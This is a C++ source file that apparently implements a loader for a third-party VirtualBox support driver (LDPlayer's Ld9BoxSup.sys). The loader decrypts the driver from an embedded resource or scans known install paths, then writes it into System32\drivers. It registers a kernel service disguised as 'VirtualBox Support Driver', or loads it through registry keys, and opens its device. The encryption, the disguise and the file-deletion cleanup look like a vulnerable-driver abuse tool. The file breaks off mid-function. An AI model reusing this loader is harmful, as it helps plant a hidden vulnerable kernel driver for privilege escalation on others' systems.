/**
 * @file driver_deployer.cpp
 * @brief Portable driver deployment implementation
 */

#include "driver_deployer.h"
#include "driver_crypto.h"
#include "supdrv_types.h"
#include "../debug.h"
#include <cstdio>
#include <cstdarg>

// NT types for NtLoadDriver and NtCreateFile
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef NTSTATUS(NTAPI* PFN_NtLoadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(NTAPI* PFN_NtUnloadDriver)(PUNICODE_STRING DriverServiceName);
typedef VOID(NTAPI* PFN_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI* PFN_NtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength);
typedef ULONG(NTAPI* PFN_RtlNtStatusToDosError)(NTSTATUS Status);

#define STATUS_SUCCESS           ((NTSTATUS)0x00000000L)
#define STATUS_IMAGE_ALREADY_LOADED ((NTSTATUS)0xC000010EL)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define OBJ_CASE_INSENSITIVE     0x00000040L
#define FILE_NON_DIRECTORY_FILE  0x00000040
#define FILE_OPEN                0x00000001

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

namespace supdrv {

//-----------------------------------------------------------------------------
// Privilege management
//-----------------------------------------------------------------------------

static bool EnablePrivilege(const wchar_t* wszPrivilege)
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }

    TOKEN_PRIVILEGES tp = {};
    if (!LookupPrivilegeValueW(NULL, wszPrivilege, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD dwError = ::GetLastError();
    CloseHandle(hToken);

    // AdjustTokenPrivileges returns TRUE even if privilege wasn't assigned
    return bResult && (dwError == ERROR_SUCCESS);
}

//-----------------------------------------------------------------------------
// Default resource configuration
//-----------------------------------------------------------------------------

const DriverResource DriverDeployer::DEFAULT_RESOURCE = {
    L"LD9BOXSUP_ENCRYPTED",   // Resource name
    RT_RCDATA,                 // Resource type
    DEVICE_NAME_LDPLAYER,      // Device: \\.\Ld9BoxDrv (corrected from Ld9BoxSup)
    L"Ld9BoxSup",              // Service name
    0                          // Use header key
};

//-----------------------------------------------------------------------------
// Known driver installation paths
//-----------------------------------------------------------------------------

const wchar_t* DriverDeployer::KNOWN_DRIVER_PATHS[] = {
    L"C:\\Program Files\\ldplayer9box\\Ld9BoxSup.sys",
    L"C:\\Program Files\\LDPlayer\\LDPlayer9\\vbox\\drivers\\Ld9BoxSup.sys",
    L"C:\\Program Files (x86)\\LDPlayer\\LDPlayer9\\vbox\\drivers\\Ld9BoxSup.sys",
    L"C:\\Program Files\\LDPlayer9\\vbox\\drivers\\Ld9BoxSup.sys",
    L"C:\\LDPlayer\\LDPlayer9\\vbox\\drivers\\Ld9BoxSup.sys",
};

const size_t DriverDeployer::KNOWN_DRIVER_PATHS_COUNT =
    sizeof(KNOWN_DRIVER_PATHS) / sizeof(KNOWN_DRIVER_PATHS[0]);

//-----------------------------------------------------------------------------
// Constructor / Destructor
//-----------------------------------------------------------------------------

DriverDeployer::DriverDeployer()
    : m_hDevice(INVALID_HANDLE_VALUE)
    , m_hService(NULL)
    , m_hSCM(NULL)
    , m_bDeployed(false)
    , m_bCreatedService(false)
    , m_bCreatedRegistry(false)
    , m_DeployMethod(DeployMethod::Auto)
{
}

DriverDeployer::~DriverDeployer()
{
    // Don't auto-cleanup - let the caller decide
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
    }
    if (m_hService) {
        CloseServiceHandle(m_hService);
    }
    if (m_hSCM) {
        CloseServiceHandle(m_hSCM);
    }
}

//-----------------------------------------------------------------------------
// Error handling
//-----------------------------------------------------------------------------

void DriverDeployer::SetError(const char* format, ...)
{
    char buffer[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    m_LastError = buffer;
}

//-----------------------------------------------------------------------------
// Static helpers
//-----------------------------------------------------------------------------

bool DriverDeployer::IsDriverLoaded()
{
    // Try LDPlayer device first
    HANDLE hDevice = CreateFileW(
        DEVICE_NAME_LDPLAYER,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
        return true;
    }

    // Try VBoxDrv
    hDevice = CreateFileW(
        DEVICE_NAME_VBOX,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
        return true;
    }

    return false;
}

bool DriverDeployer::IsServiceRegistered(const wchar_t* wszServiceName)
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        return false;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, wszServiceName, SERVICE_QUERY_STATUS);
    bool bExists = (hService != NULL);

    if (hService) {
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCM);

    return bExists;
}

bool DriverDeployer::GetServiceStatus(const wchar_t* wszServiceName, DWORD* pStatus)
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        return false;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, wszServiceName, SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }

    SERVICE_STATUS status = {};
    BOOL bResult = QueryServiceStatus(hService, &status);

    if (bResult && pStatus) {
        *pStatus = status.dwCurrentState;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return bResult != FALSE;
}

//-----------------------------------------------------------------------------
// Existing installation detection
//-----------------------------------------------------------------------------

bool DriverDeployer::TryStartExistingService(const wchar_t* wszServiceName,
                                              const wchar_t* wszDeviceName)
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        return false;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, wszServiceName,
                                       SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }

    // Check current status
    SERVICE_STATUS status = {};
    if (!QueryServiceStatus(hService, &status)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return false;
    }

    // If already running, just try to open the device
    if (status.dwCurrentState == SERVICE_RUNNING) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return OpenDevice(wszDeviceName);
    }

    // Try to start the service
    if (!StartServiceW(hService, 0, NULL)) {
        DWORD dwError = ::GetLastError();
        if (dwError != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
    }

    // Wait briefly for service to start
    Sleep(100);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    // Try to open device
    return OpenDevice(wszDeviceName);
}

bool DriverDeployer::TryUseDriverFromPath(const wchar_t* wszDriverPath,
                                           const wchar_t* wszServiceName,
                                           const wchar_t* wszDeviceName)
{
    // Check if file exists
    DWORD dwAttrib = GetFileAttributesW(wszDriverPath);
    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
        return false;
    }

    // Try to create/open the service
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        return false;
    }

    SC_HANDLE hService = CreateServiceW(
        hSCM,
        wszServiceName,
        wszServiceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        wszDriverPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        if (::GetLastError() == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceW(hSCM, wszServiceName, SERVICE_ALL_ACCESS);
        }
        if (!hService) {
            CloseServiceHandle(hSCM);
            return false;
        }
    }

    // Start the service
    if (!StartServiceW(hService, 0, NULL)) {
        DWORD dwError = ::GetLastError();
        if (dwError != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
    }

    // Wait for initialization
    Sleep(100);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    // Try to open device
    return OpenDevice(wszDeviceName);
}

bool DriverDeployer::TryUseExistingDriver(const DriverResource* pResource)
{
    // Strategy 1: Device already accessible (driver running)
    if (OpenDevice(pResource->wszDeviceName)) {
        m_bDeployed = true;
        m_DeployMethod = DeployMethod::Auto;
        return true;
    }

    // Also try VBoxDrv device name
    if (OpenDevice(DEVICE_NAME_VBOX)) {
        m_bDeployed = true;
        m_DeployMethod = DeployMethod::Auto;
        return true;
    }

    // Strategy 2: Service exists but not running - try to start it
    if (IsServiceRegistered(pResource->wszServiceName)) {
        if (TryStartExistingService(pResource->wszServiceName,
                                     pResource->wszDeviceName)) {
            m_bDeployed = true;
            m_DeployMethod = DeployMethod::SCM;
            return true;
        }
    }

    // Also check for VBoxDrv service
    if (IsServiceRegistered(L"VBoxDrv")) {
        if (TryStartExistingService(L"VBoxDrv", DEVICE_NAME_VBOX)) {
            m_bDeployed = true;
            m_DeployMethod = DeployMethod::SCM;
            return true;
        }
    }

    // Strategy 3: Scan known installation paths
    for (size_t i = 0; i < KNOWN_DRIVER_PATHS_COUNT; i++) {
        if (TryUseDriverFromPath(KNOWN_DRIVER_PATHS[i],
                                  pResource->wszServiceName,
                                  pResource->wszDeviceName)) {
            m_wszDriverPath = KNOWN_DRIVER_PATHS[i];
            m_bDeployed = true;
            m_DeployMethod = DeployMethod::SCM;
            return true;
        }
    }

    // No existing installation found
    return false;
}

//-----------------------------------------------------------------------------
// Extraction
//-----------------------------------------------------------------------------

bool DriverDeployer::ExtractFromBlob(const uint8_t* pEncrypted, size_t cbEncrypted,
                                      uint32_t dwKey, const wchar_t* wszOutputPath)
{
    DbgLog("    [ExtractFromBlob] Encrypted blob size: %zu bytes", cbEncrypted);
    DbgLog("    [ExtractFromBlob] Using key: 0x%08X (0 = header-based)", dwKey);

    std::vector<uint8_t> decrypted;

    if (dwKey == 0) {
        // Use header-based decryption (self-describing blob)
        DbgLog("    [ExtractFromBlob] Attempting header-based decryption...");

        // Check header magic
        if (cbEncrypted >= 4) {
            uint32_t magic = *(uint32_t*)pEncrypted;
            DbgLog("    [ExtractFromBlob] Header magic: 0x%08X (expected 0x4F4D4252 'OMBR')", magic);
        }

        decrypted = DriverCrypto::DecryptWithHeader(pEncrypted, cbEncrypted, nullptr);
        if (decrypted.empty()) {
            DbgLog("    [ExtractFromBlob] FAILED: DecryptWithHeader returned empty");
            SetError("Failed to decrypt driver blob: invalid header or key");
            return false;
        }
        DbgLog("    [ExtractFromBlob] Decrypted size: %zu bytes", decrypted.size());
    } else {
        // Use provided key
        DbgLog("    [ExtractFromBlob] Using explicit key decryption...");
        decrypted = DriverCrypto::Decrypt(pEncrypted, cbEncrypted, dwKey);
        DbgLog("    [ExtractFromBlob] Decrypted size: %zu bytes", decrypted.size());
    }

    // Validate PE signature
    if (decrypted.size() < 2) {
        DbgLog("    [ExtractFromBlob] FAILED: Decrypted data too small (%zu bytes)", decrypted.size());
        SetError("Decrypted data is not a valid PE file");
        return false;
    }

    DbgLog("    [ExtractFromBlob] First bytes: 0x%02X 0x%02X (expected 'MZ' = 0x4D 0x5A)",
           decrypted[0], decrypted[1]);

    if (decrypted[0] != 'M' || decrypted[1] != 'Z') {
        DbgLog("    [ExtractFromBlob] FAILED: Not a valid PE file (no MZ signature)");
        SetError("Decrypted data is not a valid PE file");
        return false;
    }
    DbgLog("    [ExtractFromBlob] PE signature valid (MZ header present)");

    // Write to disk
    DbgLog("    [ExtractFromBlob] Writing to: %ls", wszOutputPath);
    HANDLE hFile = CreateFileW(
        wszOutputPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD err = ::GetLastError();
        DbgLog("    [ExtractFromBlob] FAILED: CreateFileW error %lu", err);
        SetError("Failed to create driver file: %ls (Error: %lu)",
                 wszOutputPath, err);
        return false;
    }

    DWORD dwWritten = 0;
    BOOL bResult = WriteFile(
        hFile,
        decrypted.data(),
        static_cast<DWORD>(decrypted.size()),
        &dwWritten,
        NULL
    );
    DWORD writeErr = ::GetLastError();

    CloseHandle(hFile);

    if (!bResult || dwWritten != decrypted.size()) {
        DbgLog("    [ExtractFromBlob] FAILED: WriteFile error %lu (wrote %lu of %zu)",
               writeErr, dwWritten, decrypted.size());
        SetError("Failed to write driver file");
        DeleteFileW(wszOutputPath);
        return false;
    }

    DbgLog("    [ExtractFromBlob] SUCCESS: Wrote %lu bytes to disk", dwWritten);
    return true;
}

bool DriverDeployer::ExtractDriverFromResource(const DriverResource* pResource,
                                                const wchar_t* wszOutputPath)
{
    DbgLog("    [ExtractFromResource] Looking for resource: %ls", pResource->wszResourceName);

    // Find resource
    HRSRC hRes = FindResourceW(
        NULL,
        pResource->wszResourceName,
        pResource->wszResourceType
    );

    if (!hRes) {
        DWORD err = ::GetLastError();
        DbgLog("    [ExtractFromResource] FAILED: FindResourceW error %lu", err);
        SetError("Resource not found: %ls (Error: %lu)",
                 pResource->wszResourceName, err);
        return false;
    }
    DbgLog("    [ExtractFromResource] Resource found");

    // Load resource
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) {
        DbgLog("    [ExtractFromResource] FAILED: LoadResource returned NULL");
        SetError("Failed to load resource: %ls", pResource->wszResourceName);
        return false;
    }

    // Get pointer and size
    LPVOID pEncrypted = LockResource(hData);
    DWORD dwSize = SizeofResource(NULL, hRes);

    DbgLog("    [ExtractFromResource] Resource data: %p, size: %lu bytes", pEncrypted, dwSize);

    if (!pEncrypted || dwSize == 0) {
        DbgLog("    [ExtractFromResource] FAILED: Empty resource data");
        SetError("Failed to access resource data");
        return false;
    }

    return ExtractFromBlob(
        static_cast<const uint8_t*>(pEncrypted),
        dwSize,
        pResource->dwEncryptionKey,
        wszOutputPath
    );
}

//-----------------------------------------------------------------------------
// Device access - uses NtCreateFile for NT device paths
//-----------------------------------------------------------------------------

bool DriverDeployer::OpenDevice(const wchar_t* wszDeviceName)
{
    DbgLog("    [OpenDevice] Trying: %ls", wszDeviceName);

    // VirtualBox/LDPlayer drivers do NOT create DosDevices symlinks!
    // We must use NtCreateFile with NT device paths like \Device\Ld9BoxDrv
    // The driver binary only contains \Device\* paths, not \DosDevices\*

    // Get ntdll functions
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        DbgLog("    [OpenDevice] FAILED: Could not get ntdll.dll handle");
        SetError("Failed to get ntdll.dll handle");
        return false;
    }

    auto RtlInitUnicodeString = reinterpret_cast<PFN_RtlInitUnicodeString>(
        GetProcAddress(hNtdll, "RtlInitUnicodeString"));
    auto NtCreateFile = reinterpret_cast<PFN_NtCreateFile>(
        GetProcAddress(hNtdll, "NtCreateFile"));
    auto RtlNtStatusToDosError = reinterpret_cast<PFN_RtlNtStatusToDosError>(
        GetProcAddress(hNtdll, "RtlNtStatusToDosError"));

    if (!RtlInitUnicodeString || !NtCreateFile) {
        DbgLog("    [OpenDevice] FAILED: Could not resolve ntdll functions");
        SetError("Failed to resolve ntdll functions");
        return false;
    }

    // Convert DosDevices path (\\.\Ld9BoxDrv) to NT path (\Device\Ld9BoxDrv)
    // if needed, or use NT path directly
    std::wstring ntPath;
    if (wcsncmp(wszDeviceName, L"\\\\.\\", 4) == 0) {
        // Convert \\.\DeviceName to \Device\DeviceName
        ntPath = L"\\Device\\";
        ntPath += (wszDeviceName + 4);
        DbgLog("    [OpenDevice] Converted to NT path: %ls", ntPath.c_str());
    } else if (wcsncmp(wszDeviceName, L"\\Device\\", 8) == 0) {
        // Already an NT path
        ntPath = wszDeviceName;
    } else {
        DbgLog("    [OpenDevice] FAILED: Unknown device path format");
        SetError("Unknown device path format: %ls", wszDeviceName);
        return false;
    }

    // Initialize UNICODE_STRING for the device path
    UNICODE_STRING usDeviceName;
    RtlInitUnicodeString(&usDeviceName, ntPath.c_str());

    // Initialize OBJECT_ATTRIBUTES
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &usDeviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Open the device using NtCreateFile
    IO_STATUS_BLOCK ioStatus = {};
    HANDLE hDevice = INVALID_HANDLE_VALUE;

    NTSTATUS status = NtCreateFile(
        &hDevice,
        GENERIC_READ | GENERIC_WRITE,
        &objAttr,
        &ioStatus,
        NULL,               // AllocationSize
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,          // CreateDisposition - open existing
        FILE_NON_DIRECTORY_FILE,
        NULL,               // EaBuffer
        0                   // EaLength
    );

    if (!NT_SUCCESS(status)) {
        DbgLog("    [OpenDevice] FAILED: NtCreateFile returned 0x%08X", status);
        DbgLog("    [OpenDevice]   0xC0000034 = STATUS_OBJECT_NAME_NOT_FOUND");
        DbgLog("    [OpenDevice]   0xC0000022 = STATUS_ACCESS_DENIED");
        DbgLog("    [OpenDevice]   0xC0000024 = STATUS_OBJECT_TYPE_MISMATCH");

        // Map NTSTATUS to Win32 error for compatibility
        SetLastError(RtlNtStatusToDosError ? RtlNtStatusToDosError(status) : ERROR_FILE_NOT_FOUND);
        SetError("Failed to open device: %ls (NTSTATUS: 0x%08X)",
                 ntPath.c_str(), status);
        return false;
    }

    m_hDevice = hDevice;
    DbgLog("    [OpenDevice] SUCCESS: %ls handle=%p", ntPath.c_str(), m_hDevice);
    return true;
}

//-----------------------------------------------------------------------------
// SCM-based deployment
//-----------------------------------------------------------------------------

bool DriverDeployer::DeployViaSCM(const DriverResource* pResource)
{
    DbgLog("  [DeployViaSCM] Starting SCM-based deployment...");
    DbgLog("  [DeployViaSCM] Service name: %ls", pResource->wszServiceName);
    DbgLog("  [DeployViaSCM] Device name: %ls", pResource->wszDeviceName);

    // Determine output path - try System32\drivers first
    wchar_t wszTargetPath[MAX_PATH];
    if (!GetSystemDirectoryW(wszTargetPath, MAX_PATH)) {
        DbgLog("  [DeployViaSCM] FAILED: GetSystemDirectoryW");
        SetError("Failed to get system directory");
        return false;
    }
    wcscat_s(wszTargetPath, L"\\drivers\\");
    wcscat_s(wszTargetPath, pResource->wszServiceName);
    wcscat_s(wszTargetPath, L".sys");

    DbgLog("  [DeployViaSCM] Target path: %ls", wszTargetPath);

    // Try to extract to System32\drivers
    DbgLog("  [DeployViaSCM] Extracting driver from resource...");
    if (!ExtractDriverFromResource(pResource, wszTargetPath)) {
        DbgLog("  [DeployViaSCM] System32 extraction failed, trying temp...");
        // Fallback to temp directory
        if (!GetTempPathW(MAX_PATH, wszTargetPath)) {
            DbgLog("  [DeployViaSCM] FAILED: GetTempPathW");
            SetError("Failed to get temp path");
            return false;
        }
        wcscat_s(wszTargetPath, pResource->wszServiceName);
        wcscat_s(wszTargetPath, L".sys");

        DbgLog("  [DeployViaSCM] Temp target path: %ls", wszTargetPath);

        if (!ExtractDriverFromResource(pResource, wszTargetPath)) {
            DbgLog("  [DeployViaSCM] FAILED: Extraction to temp also failed");
            return false;
        }
    }

    m_wszDriverPath = wszTargetPath;
    DbgLog("  [DeployViaSCM] Driver extracted to: %ls", wszTargetPath);

    // Verify file exists
    DWORD fileAttrs = GetFileAttributesW(wszTargetPath);
    if (fileAttrs == INVALID_FILE_ATTRIBUTES) {
        DbgLog("  [DeployViaSCM] WARNING: File not found after extraction! Error %lu", ::GetLastError());
    } else {
        DbgLog("  [DeployViaSCM] File verified on disk (attrs=0x%08X)", fileAttrs);
    }

    // Open SCM
    DbgLog("  [DeployViaSCM] Opening SCM...");
    m_hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!m_hSCM) {
        DWORD err = ::GetLastError();
        DbgLog("  [DeployViaSCM] FAILED: OpenSCManagerW error %lu", err);
        SetError("Failed to open SCM (Error: %lu). Need administrator rights.", err);
        DeleteFileW(wszTargetPath);
        return false;
    }
    DbgLog("  [DeployViaSCM] SCM opened");

    m_wszServiceName = pResource->wszServiceName;

    // Create service
    DbgLog("  [DeployViaSCM] Creating service '%ls'...", m_wszServiceName.c_str());
    m_hService = CreateServiceW(
        m_hSCM,
        m_wszServiceName.c_str(),
        L"VirtualBox Support Driver",
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        wszTargetPath,
        NULL,  // Load order group
        NULL,  // Tag
        NULL,  // Dependencies
        NULL,  // Service start name
        NULL   // Password
    );

    if (!m_hService) {
        DWORD dwError = ::GetLastError();
        DbgLog("  [DeployViaSCM] CreateServiceW failed: error %lu", dwError);
        if (dwError == ERROR_SERVICE_EXISTS) {
            DbgLog("  [DeployViaSCM] Service exists, opening...");
            // Service already exists - try to open it
            m_hService = OpenServiceW(m_hSCM, m_wszServiceName.c_str(),
                                       SERVICE_ALL_ACCESS);
            if (!m_hService) {
                DWORD err = ::GetLastError();
                DbgLog("  [DeployViaSCM] FAILED: OpenServiceW error %lu", err);
                SetError("Failed to open existing service (Error: %lu)", err);
                DeleteFileW(wszTargetPath);
                return false;
            }
            DbgLog("  [DeployViaSCM] Opened existing service");
            m_bCreatedService = false;
        } else {
            SetError("Failed to create service (Error: %lu)", dwError);
            DeleteFileW(wszTargetPath);
            return false;
        }
    } else {
        DbgLog("  [DeployViaSCM] Service created successfully");
        m_bCreatedService = true;
    }

    // Start service
    DbgLog("  [DeployViaSCM] Starting service...");
    if (!StartServiceW(m_hService, 0, NULL)) {
        DWORD dwError = ::GetLastError();
        DbgLog("  [DeployViaSCM] StartServiceW returned error %lu", dwError);
        if (dwError != ERROR_SERVICE_ALREADY_RUNNING) {
            DbgLog("  [DeployViaSCM] FAILED: Service start failed");
            SetError("Failed to start service (Error: %lu)", dwError);
            if (m_bCreatedService) {
                DeleteService(m_hService);
            }
            DeleteFileW(wszTargetPath);
            return false;
        }
        DbgLog("  [DeployViaSCM] Service already running (OK)");
    } else {
        DbgLog("  [DeployViaSCM] StartServiceW succeeded");
    }

    // Query service status
    SERVICE_STATUS status = {};
    if (QueryServiceStatus(m_hService, &status)) {
        DbgLog("  [DeployViaSCM] Service state: %lu (4=RUNNING, 1=STOPPED, 2=START_PENDING)",
               status.dwCurrentState);
    }

    // Wait for driver initialization - retry loop for race condition mitigation
    DbgLog("  [DeployViaSCM] Waiting for device to become accessible...");
    DWORD dwErrors[3] = {0};
    const wchar_t* deviceNames[] = {
        pResource->wszDeviceName,    // Primary: \\.\Ld9BoxDrv
        DEVICE_NAME_LDPLAYER_USER,   // User variant: \\.\Ld9BoxDrvU
        DEVICE_NAME_VBOX             // Legacy VBox: \\.\VBoxDrv
    };

    for (int retry = 0; retry < 5; retry++) {
        DbgLog("  [DeployViaSCM] Retry %d/5...", retry + 1);
        Sleep(100);  // 100ms per attempt, up to 500ms total

        for (int i = 0; i < 3; i++) {
            if (OpenDevice(deviceNames[i])) {
                DbgLog("  [DeployViaSCM] SUCCESS: Device opened on retry %d", retry + 1);
                m_DeployMethod = DeployMethod::SCM;
                m_bDeployed = true;
                return true;
            }
            dwErrors[i] = ::GetLastError();
        }
    }

    DbgLog("  [DeployViaSCM] FAILED: All device open attempts failed after 500ms");
    DbgLog("  [DeployViaSCM]   %ls -> error %lu", deviceNames[0], dwErrors[0]);
    DbgLog("  [DeployViaSCM]   %ls -> error %lu", deviceNames[1], dwErrors[1]);
    DbgLog("  [DeployViaSCM]   %ls -> error %lu", deviceNames[2], dwErrors[2]);

    SetError("Driver service started but device not accessible after 500ms. "
             "Tried %ls (error %lu), %ls (error %lu), %ls (error %lu). "
             "Check Event Viewer > System for driver errors.",
             deviceNames[0], dwErrors[0],
             deviceNames[1], dwErrors[1],
             deviceNames[2], dwErrors[2]);

    DbgLog("  [DeployViaSCM] Cleaning up...");
    SERVICE_STATUS svcStatus;
    ControlService(m_hService, SERVICE_CONTROL_STOP, &svcStatus);
    if (m_bCreatedService) {
        DeleteService(m_hService);
    }
    DeleteFileW(wszTargetPath);
    return false;
}

//-----------------------------------------------------------------------------
// NtLoadDriver-based deployment
//-----------------------------------------------------------------------------

bool DriverDeployer::CreateDriverRegistry(const wchar_t* wszDriverPath,
                                           const wchar_t* wszServiceName)
{
    DbgLog("    [CreateDriverRegistry] Creating registry for: %ls", wszServiceName);

    // Registry path: HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
    std::wstring regPath = L"SYSTEM\\CurrentControlSet\\Services\\";
    regPath += wszServiceName;

    DbgLog("    [CreateDriverRegistry] Registry path: %ls", regPath.c_str());

    HKEY hKey = NULL;
    DWORD dwDisposition = 0;

    LONG result = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        regPath.c_str(),
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (result != ERROR_SUCCESS) {
        DbgLog("    [CreateDriverRegistry] FAILED: RegCreateKeyExW error %ld", result);
        SetError("Failed to create registry key (Error: %ld)", result);
        return false;
    }
    DbgLog("    [CreateDriverRegistry] Key created (disposition=%lu: 1=new, 2=existing)", dwDisposition);

    // ImagePath = \??\<DriverPath>
    std::wstring imagePath = L"\\??\\";
    imagePath += wszDriverPath;

    DbgLog("    [CreateDriverRegistry] ImagePath: %ls", imagePath.c_str());

    result = RegSetValueExW(
        hKey,
        L"ImagePath",
        0,
        REG_EXPAND_SZ,
        reinterpret_cast<const BYTE*>(imagePath.c_str()),
        static_cast<DWORD>((imagePath.length() + 1) * sizeof(wchar_t))
    );

    if (result != ERROR_SUCCESS) {
        DbgLog("    [CreateDriverRegistry] FAILED: Set ImagePath error %ld", result);
        RegCloseKey(hKey);
        SetError("Failed to set ImagePath (Error: %ld)", result);
        return false;
    }

    // Type = SERVICE_KERNEL_DRIVER (1)
    DWORD dwType = 1;
    result = RegSetValueExW(
        hKey,
        L"Type",
        0,
        REG_DWORD,
        reinterpret_cast<const BYTE*>(&dwType),
        sizeof(dwType)
    );

    if (result != ERROR_SUCCESS) {
        DbgLog("    [CreateDriverRegistry] FAILED: Set Type error %ld", result);
        RegCloseKey(hKey);
        SetError("Failed to set Type (Error: %ld)", result);
        return false;
    }

    // Start = SERVICE_DEMAND_START (3)
    DWORD dwStart = 3;
    result = RegSetValueExW(
        hKey,
        L"Start",
        0,
        REG_DWORD,
        reinterpret_cast<const BYTE*>(&dwStart),
        sizeof(dwStart)
    );

    if (result != ERROR_SUCCESS) {
        DbgLog("    [CreateDriverRegistry] FAILED: Set Start error %ld", result);
        RegCloseKey(hKey);
        SetError("Failed to set Start (Error: %ld)", result);
        return false;
    }

    // ErrorControl = SERVICE_ERROR_NORMAL (1)
    DWORD dwErrorControl = 1;
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD,
                   reinterpret_cast<const BYTE*>(&dwErrorControl),
                   sizeof(dwErrorControl));

    RegCloseKey(hKey);
    m_bCreatedRegistry = true;
    DbgLog("    [CreateDriverRegistry] SUCCESS: Registry configured");
    return true;
}

//-----------------------------------------------------------------------------
// SecureDeleteFile - Delete file with retry logic and reboot fallback
//-----------------------------------------------------------------------------
static bool SecureDeleteFile(const wchar_t* wszPath)
{
    if (!wszPath || !wszPath[0]) {
        return true; // Empty path - nothing to delete
    }

    constexpr int MAX_RETRIES = 5;
    constexpr DWORD RETRY_DELAY_MS = 100;

    for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
        if (DeleteFileW(wszPath)) {
            DbgLog("    [SecureDeleteFile] Deleted: %ls (attempt %d)", wszPath, attempt + 1);
            return true;
        }

        DWORD err = ::GetLastError();

        if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND) {
